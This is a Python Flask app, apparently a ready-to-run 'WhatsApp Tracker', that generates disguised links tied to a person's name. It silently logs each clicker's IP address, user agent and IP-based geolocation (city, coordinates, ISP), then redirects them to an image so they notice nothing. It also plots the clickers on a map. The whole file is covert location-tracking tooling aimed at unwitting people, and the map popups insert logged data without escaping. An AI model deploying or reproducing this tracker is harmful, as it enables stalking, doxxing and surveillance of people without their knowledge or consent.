from flask import Flask, request, redirect, render_template_string, jsonify
import sqlite3
import shortuuid
import requests
import json
from datetime import datetime, timezone
import logging

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Banco de dados simples
DB = "logs.db"

def init_db():
    """Inicializa o banco de dados."""
    try:
        with sqlite3.connect(DB) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    code TEXT NOT NULL,
                    ip TEXT,
                    ua TEXT,
                    geo TEXT,
                    ts TEXT NOT NULL
                )
            """)
            conn.execute("CREATE INDEX IF NOT EXISTS idx_code ON logs(code)")
            logger.info("Banco de dados inicializado com sucesso")
    except Exception as e:
        logger.error(f"Erro ao inicializar banco de dados: {e}")
        raise

init_db()

@app.route("/")
def index():
    return "WhatsApp Tracker rodando. Use /gen/nome para gerar link."

@app.route("/gen/<nome>")
def gerar(nome):
    """Gera um link de rastreamento único."""
    if not nome or len(nome) > 50:
        return jsonify({"error": "Nome inválido"}), 400

    code = shortuuid.uuid()[:6]
    link = f"https://{request.host}/t/{code}"
    mapa_link = f"https://{request.host}/map/{code}"

    logger.info(f"Link gerado para '{nome}': {code}")
    return jsonify({
        "nome": nome,
        "link": link,
        "mapa": mapa_link,
        "code": code
    })

@app.route("/t/<code>")
def track(code):
    """Rastreia acesso e redireciona para imagem."""
    # Validar código
    if not code or len(code) > 10:
        return "Link inválido", 400

    # Obter IP (considerando proxies)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent", "Unknown")

    # Obter geolocalização
    geo = {}
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={
                "fields": "status,message,city,regionName,country,lat,lon,isp,query"
            },
            timeout=3
        )
        data = response.json()
        if data.get("status") == "success":
            geo = data
    except Exception as e:
        logger.warning(f"Erro ao obter geolocalização para {ip}: {e}")

    # Salvar no banco de dados
    try:
        with sqlite3.connect(DB) as conn:
            conn.execute(
                "INSERT INTO logs (code, ip, ua, geo, ts) VALUES (?, ?, ?, ?, ?)",
                (code, ip, ua, json.dumps(geo), datetime.now(timezone.utc).isoformat())
            )
        logger.info(f"Acesso rastreado: {code} - {ip} - {geo.get('city', 'N/A')}")
    except Exception as e:
        logger.error(f"Erro ao salvar log: {e}")

    # Redirecionar para imagem
    return redirect("https://i.imgur.com/8Ki7bLR.jpeg", code=302)

@app.route("/map/<code>")
def mapa(code):
    """Exibe mapa com localizações dos acessos."""
    # Validar código
    if not code or len(code) > 10:
        return "Código inválido", 400

    try:
        with sqlite3.connect(DB) as conn:
            rows = conn.execute("SELECT * FROM logs WHERE code=?", (code,)).fetchall()
    except Exception as e:
        logger.error(f"Erro ao buscar logs: {e}")
        return "Erro ao carregar dados", 500

    # Processar logs
    logs = [dict(zip(["id", "code", "ip", "ua", "geo", "ts"], row)) for row in rows]
    for l in logs:
        l["geo"] = json.loads(l["geo"]) if l["geo"] else {}

    # Se não houver logs, retornar mensagem
    if not logs:
        return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Sem dados</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }
                    .message {
                        text-align: center;
                        background: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    }
                </style>
            </head>
            <body>
                <div class="message">
                    <h2>Nenhum acesso registrado ainda</h2>
                    <p>O código <strong>{{ code }}</strong> ainda não foi acessado.</p>
                </div>
            </body>
            </html>
        """, code=code)

    # Calcular centro do mapa baseado no primeiro log válido
    default_lat = -15.78
    default_lon = -47.92
    for l in logs:
        if l["geo"].get("lat") and l["geo"].get("lon"):
            default_lat = l["geo"]["lat"]
            default_lon = l["geo"]["lon"]
            break

    map_html = """
<!DOCTYPE html>
<html>
<head>
  <title>Mapa Rastreamento - {{ code }}</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
  <style>
    body { margin: 0; font-family: Arial, sans-serif; }
    #map { height: 100vh; }
    .info-panel {
      position: absolute;
      top: 10px;
      right: 10px;
      background: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      z-index: 1000;
      max-width: 300px;
    }
    .info-panel h3 { margin: 0 0 10px 0; font-size: 16px; }
    .info-panel p { margin: 5px 0; font-size: 13px; }
  </style>
</head>
<body>
  <div class="info-panel">
    <h3>📍 Rastreamento</h3>
    <p><strong>Código:</strong> {{ code }}</p>
    <p><strong>Total de acessos:</strong> {{ logs|length }}</p>
    <p><strong>IPs únicos:</strong> {{ unique_ips }}</p>
  </div>
  <div id="map"></div>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    const logs = {{ logs|tojson }};
    const defaultLat = {{ default_lat }};
    const defaultLon = {{ default_lon }};

    // Inicializar mapa
    const map = L.map('map').setView([defaultLat, defaultLon], 5);

    // Adicionar camada de tiles
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    // Adicionar marcadores
    const markers = [];
    logs.forEach((l, index) => {
      if (l.geo && l.geo.lat && l.geo.lon) {
        const lat = parseFloat(l.geo.lat);
        const lon = parseFloat(l.geo.lon);

        if (!isNaN(lat) && !isNaN(lon)) {
          const popup = `
            <strong>${l.geo.city || 'N/A'}, ${l.geo.country || 'N/A'}</strong><br>
            <strong>IP:</strong> ${l.ip}<br>
            <strong>ISP:</strong> ${l.geo.isp || 'N/A'}<br>
            <strong>Data:</strong> ${new Date(l.ts).toLocaleString('pt-BR')}
          `;

          const marker = L.marker([lat, lon]).addTo(map).bindPopup(popup);
          markers.push([lat, lon]);
        }
      }
    });

    // Ajustar zoom para mostrar todos os marcadores
    if (markers.length > 1) {
      map.fitBounds(markers);
    }
  </script>
</body>
</html>
    """

    # Calcular IPs únicos
    unique_ips = len(set(l["ip"] for l in logs if l["ip"]))

    return render_template_string(
        map_html,
        logs=logs,
        code=code,
        default_lat=default_lat,
        default_lon=default_lon,
        unique_ips=unique_ips
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
